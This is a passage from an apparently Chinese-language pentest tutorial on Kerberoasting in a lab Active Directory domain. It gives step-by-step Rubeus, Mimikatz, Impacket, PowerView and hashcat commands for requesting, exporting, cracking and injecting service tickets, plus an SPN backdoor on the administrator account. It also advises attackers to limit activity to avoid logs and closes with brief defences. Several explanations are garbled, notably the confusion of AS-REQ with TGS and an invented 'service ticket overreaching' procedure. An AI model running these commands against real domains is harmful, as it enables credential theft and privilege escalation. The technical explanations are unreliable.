Domain          : sub.sectest.com
ServerName      : sub.sectest.com\krbgt
SPNServices     : kadmin
OperatingSystem : 
OSServicePack   : 
LastBootup      : 1601/1/1 8:00:00
OSVersion       : 
Description     : 
Domain          : sectest.com
ServerName      : DC-1.sectest.com
SPNServices     : Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04;DNS;exchangeAB;ldap
OperatingSystem : {Windows Server 2016 Standard}
OSServicePack   : 
LastBootup      : 2022/9/24 18:37:02
OSVersion       : {10.0 (14393)}
Description     : 
Domain          : _msdcs.sectest.com.sub.sectest.com
ServerName      : _msdcs.sectest.com.sub.sectest.com\DNSzone
SPNServices     : ldap
OperatingSystem : {Windows Server 2016 Standard}
OSServicePack   : 
LastBootup      : 2022/9/24 18:37:02
OSVersion       : {10.0 (14393)}
Description     : 
```
### GetUserSPNs
`GetUserSPNs` 是一个开源的 PowerShell 脚本，用于枚举活动目录中已注册的用户 SPN。它的工作原理是，首先查询活动目录中的所有用户帐户，然后通过 Kerberos 协议尝试获取与该用户帐户关联的 SPN。如果成功，脚本将显示已找到的 SPN 信息，包括 SPN 的语法格式、用户账号和所在计算机名。
> 下载地址：https://github.com/nidem/kerberoast.git
![image-20220925173531276](../../.gitbook/assets/image-20220925173531276.png)
### PowerView
PowerView 是一个 PowerShell 模块，可以用于自动化执行活动目录渗透测试和安全审计任务。
> 下载地址：https://github.com/PowerShellMafia/PowerSploit/
```
beacon> powershell Get-NetUser -SPN
```
![image-20220925183639996](../../.gitbook/assets/image-20220925183639996.png)
### Impacket
`GetUserSPNs.py` 是 Impacket 工具集中的一个脚本，用于枚举活动目录中已注册的用户 SPN。
```
┌──(root㉿kali)-[/opt/impacket]
└─# GetUserSPNs.py  sectest.com/administrator -dc-ip sectest.com
```
> 没有给`machao`用户进行远程访问权限。
![image-20220925184914025](../../.gitbook/assets/image-20220925184914025.png)
## Kerberoasting 攻击原理
Kerberoasting 攻击是一种利用 Kerberos 协议漏洞的攻击方式，可以在不知道用户密码的情况下，从活动目录中枚举出可以被攻击的用户账户，获取其 Kerberos 预身份验证票据（AS-REQ），并对其进行脱机暴力破解。如果用户账户的服务主体名称（SPN）符合特定的格式，则可以直接获取到 Kerberos 服务票据（TGS），并对其进行暴力破解，从而获得用户账户的明文密码或哈希值。
Kerberoasting 攻击的过程如下：
1. 攻击者枚举活动目录中所有的用户账户，查找其中可以被攻击的账户。通常，攻击者会使用 BloodHound 等工具进行自动化枚举和查询。
2. 攻击者获取目标账户的服务主体名称（SPN），并将其提交给域控制器（DC）。
3. DC 返回一个 Kerberos 预身份验证票据（AS-REQ），其中包括加密的 TGT 和一些元数据信息。
4. 攻击者使用工具（如 Rubeus）对 AS-REQ 进行脱机暴力破解，从中获取 TGT 的哈希值。
5. 如果目标账户的 SPN 符合 Kerberoasting 漏洞的要求（即 SPN 是基于服务账户的服务，且服务不需要用户密码验证），则攻击者可以直接使用 TGS-REP 响应中的信息获取 Kerberos 服务票据（TGS）。
6. 攻击者使用工具（如 hashcat）对 TGS 进行暴力破解，从中获取用户账户的明文密码或哈希值。
攻击流程图
```mermaid
graph TD;
  A[攻击者枚举目标账户] --> B[获取目标账户的 SPN];
  B --> C[提交 SPN 给域控制器];
  C --> D[获取 Kerberos 预身份验证票据AS-REQ];
  D --> E[对 AS-REQ 进行暴力破解];
  E --> F[获取 TGT 的哈希值];
  F -- SPN 不符合 Kerberoasting 要求 --> G[攻击者无法获取 TGS];
  F -- SPN 符合 Kerberoasting 要求 --> H[获取 Kerberos 服务票据TGS];
  H --> I[对 TGS 进行暴力破解];
  I --> J[获取账户的明文密码或哈希值];
```
## 请求服务票据
### 使用 Rubeus 工具
> 下载地址：https://github.com/GhostPack/Rubeus
Rubeus 的 kerberoasting 模块可以用于执行 Kerberoasting 攻击，即通过枚举活动目录中的账户和 SPN，获取 Kerberos 预身份验证票据（AS-REQ），并对其进行脱机暴力破解，从中获取用户账户的哈希值。
```
beacon> execute-assembly D:\tools\Rubeus.exe kerberoast /domain:sectest.com
```
![image-20220925185558622](../../.gitbook/assets/image-20220925185558622.png)
### 使用 PowerShell 命令请求
GetUserSPNs.ps1 是一款基于 PowerShell 编写的工具，可以用于在活动目录中获取可猎取的账户的 Kerberos 服务主体名称（SPN）。它的工作原理是枚举活动目录中所有的用户账户，查找其中可以用于 Kerberoasting 攻击的账户，并获取其对应的 SPN，最后将 SPN 输出到屏幕上或保存到文件中。
请求服务票据 
```powershell
powershell-import D:\GetUserSPNs.ps1
powershell  Add-Type -AssemblyName System.IdentityModel
```
![image-20220925174050797](../../.gitbook/assets/image-20220925174050797.png)
PowerShell 中用于创建 Kerberos 安全令牌对象的 cmdlet。该 cmdlet 可以用于在 PowerShell 中生成 Kerberos 安全令牌，从而进行 Kerberos 认证或者 Kerberoasting 攻击。
```
powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.sectest.com"
```
![image-20220925174305428](../../.gitbook/assets/image-20220925174305428.png)
列出服务票据
```
run klist
```
![QQ录屏20220925174424](../../.gitbook/assets/QQ录屏20220925174424.gif)
### 使用 Mimikatz 工具请求
使用 Mimikatz 请求指定 SPN 的服务票据，请求服务票据
```
beacon> mimikatz kerberos::ask /target:MSSQLSvc/sqlserver.sectest.com
```
![image-20220925185831758](../../.gitbook/assets/image-20220925185831758.png)
列出服务票据
```
beacon> mimikatz kerberos::list    
```
![image-20220925185950039](../../.gitbook/assets/image-20220925185950039.png)
## 服务票据的导出
### 使用 Mimikatz 工具导出
```
beacon> mimikatz kerberos::list /export
```
![QQ录屏20220925175922](../../.gitbook/assets/QQ录屏20220925175922.gif)
### 使用 Invoke-Kerberoast.ps1 脚本
> 项目地址：https://github.com/EmpireProject/Empire
`Invoke-Kerberoast.ps1` 是一款基于 PowerShell 编写的 Kerberoasting 工具，可以用于在活动目录中枚举和攻击可猎取账户的 SPN，获取其对应的哈希值，并进行脱机暴力破解。
`Invoke-Kerberoast.ps1` 的工作原理是使用 PowerShell 远程连接到目标系统，然后使用 `Get-DomainUser` cmdlet 枚举活动目录中的用户账户，并筛选出可猎取的账户。然后，使用 `Invoke-Mimikatz` cmdlet 生成 Kerberos 预身份验证票据（AS-REQ），并使用哈希工具对其进行破解，从中获取账户的哈希值。
```
Import-Module .\Invoke-Kerberoast.ps1  
Invoke-Kerberoast -outputFormat Hashcat
```
![image-20220625194140601](../../.gitbook/assets/image-20220625194140601.png)
## 服务票据的暴力破解
### 使用 tgsrepcrack.py 脚本
> 下载地址：https://github.com/nidem/kerberoast.git
`tgsrepcrack.py` 是一款 Python 编写的 Kerberoasting 工具，可以用于破解 Kerberos 预身份验证票据（AS-REQ）的哈希值，从而获取账户的明文密码或者哈希值。
> python  tgsrepcrack.py  
```
┌──(root㉿kali)-[/opt/kerberoast-master]
└─# python3 tgsrepcrack.py wordlist /tmp/8-40a10000-machao@MSSQLSvc\~sqlserver.sectest.com-SECTEST.COM.kirbi 
```
![image-20220925180310749](../../.gitbook/assets/image-20220925180310749.png)
### 使用 Hashcat 工具
使用hashcat进行爆破哈希
```
┌──(root💀kali)-[/tmp]
└─# hashcat  -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
![image-20220625195245892](../../.gitbook/assets/image-20220625195245892.png)
## 服务票据重写和注入
服务票据重写（Service Ticket Overreaching）是一种利用 Kerberos 协议漏洞的攻击技术。它可以将一个普通的用户票据（TGT）转化成一个服务票据（TGS），并且该服务票据可以被用于访问活动目录中的服务或系统。这样，攻击者就可以使用该服务票据访问敏感资源，获取域管理员权限，或者进行其他恶意活动。
服务票据重写攻击可以分为以下几个步骤：
1. 获取普通的用户票据（TGT）：攻击者需要先获取一个普通用户的 TGT，以便使用其加密会话密钥来构造服务票据。
2. 构造服务票据（TGS）：攻击者需要使用 TGT 中的加密会话密钥来构造一个服务票据（TGS），并将其发送到目标系统中进行认证。
3. 认证服务票据（TGS）：目标系统会对收到的服务票据进行认证，如果票据有效，则会将服务的访问权限授予攻击者。
服务票据重写攻击可以绕过 Kerberos 协议中的安全机制，从而实现对敏感资源的访问。这种攻击技术比较难以检测，因此，防范服务票据重写攻击需要注意 Kerberos 协议的安全配置，并使用防火墙和 IDS 等安全措施对网络流量进行监控和过滤。
以下是使用 `kerberoast.py` 进行服务票据重写的步骤：
1. 获取攻击者权限：在目标系统中获取管理员权限或者 Domain Admin 权限，以便进行服务票据重写攻击。
2. 枚举 SPN：使用 Rubeus、GetUserSPNs 或 BloodHound 等工具，枚举活动目录中的 SPN，并保存到一个文件中。
3. 获取 TGS：使用 `kerberoast.py` 工具，从活动目录中获取指定 SPN 的可猎取账户的 Kerberos 预身份验证票据（AS-REQ），并将其转化为服务票据（TGS），从而绕过 Kerberos 认证。例如，可以使用以下命令获取 SPN 为 MSSQLSvc/sqlserver.sectest.com 的账户的服务票据：
   ```
   python kerberoast.py -spn MSSQLSvc/sqlserver.sectest.com
   ```
   执行该命令后，工具会自动从活动目录中获取可猎取账户的 AS-REQ，并将其转化为服务票据（TGS），输出到屏幕上或保存到文件中。例如，可以将服务票据保存到 tgs.txt 文件中：
   ```
   python kerberoast.py -spn MSSQLSvc/sqlserver.sectest.com > tgs.txt
   ```
4. 注入服务票据：使用 Mimikatz 或者其他工具，将服务票据注入到目标系统中。例如，可以使用以下命令使用 Mimikatz 将服务票据注入到当前进程中：
   ```
   mimikatz.exe "kerberos::ptt /ticket:tgs.txt"
   ```
   执行该命令后，服务票据会被注入到当前进程的票据缓存中，从而绕过 Kerberos 认证，获取系统或域管理员权限。
需要注意的是，服务票据重写攻击会在目标系统中生成 Kerberos TGS 票据，因此，攻击者应该尽可能地减少服务票据重写攻击的数量和频率，以避免在目标系统中留下可疑的日志和痕迹。同时，由于 Kerberos 哈希值可以在离线状态下进行暴力破解，因此，建议在生成 Kerberos TGS 票据时采用强密码，以提高破解难度，加强系统的安全性。同时，攻击者应该使用高强度的密码字典和破解工具，以提高破解哈希值的成功率。
## AES加密
> 在管理服务器上，转到**本地组策略编辑器**>**计算机配置**> **Windows 设置**>**安全设置**>**本地策略**>**安全选项**>**网络安全：配置 Kerberos 允许的加密类型**>**开启 RC4**。
>
> 在提升的命令提示符下运行`gpupdate /force`命令以确保更改已完成。
尽管双方都支持 AES 加密，但还是返回了使用 RC4（加密类型 `0x17/23`）加密的 TGS 票证。请注意，SOC 可能正在监视使用 RC4 加密的票证：
![QQ录屏20220925192711](../../.gitbook/assets/QQ录屏20220925192711.gif)
## Kerberoast后门
以管理员权限运行注册一个SPN服务
```
Set-DomainObject -Identity sectest.com\administrator -Set @{serviceprincipalname="a/b"}
Get-DomainUser -Identity sectest.com\administrator | Get-DomainSPNTicket
```
![QQ录屏20220925200407](../../.gitbook/assets/QQ录屏20220925200407.gif)
清除SPN：
```sql
Set-DomainObject -Identity sectest.com\administrator -clear serviceprincipalname
```
## Kerberoast 攻击的防范思路
1. 强制使用 AES256_HMAC 方式对 Kerberos票据进行加密
2. 增强密码策略：Kerberoast 攻击主要是基于暴力破解密码的，因此，增强密码策略可以有效降低攻击的成功率。建议采用长、复杂、随机的密码，并对密码进行定期更换和强制更新。
3. 禁用不必要的账户和服务：将不需要预身份验证的账户和服务禁用或限制，可以有效减少 Kerberoast 攻击的风险。这些账户和服务通常包括 IIS、Exchange、SQL Server、SharePoint 等。
**在进行日志审计时，可以重点关注ID为4769（请求Kerberos服务票据）的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。**
![image-20220925182232525](../../.gitbook/assets/image-20220925182232525.png)